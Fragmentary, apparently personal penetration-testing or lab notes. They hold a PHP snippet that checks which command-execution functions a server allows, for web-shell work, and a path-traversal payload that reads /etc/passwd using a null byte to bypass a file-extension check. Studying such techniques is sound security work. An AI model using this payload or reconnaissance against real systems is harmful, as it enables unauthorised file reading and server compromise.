```jsx
<?php

print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));

?>
```

to check wi

I used [Acunetix PHP script](https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/) to check what functions are enabled:

```jsx
?file=../../../etc/passwd%00 ⇒ null byte to bypass extention
```

```jsx

```
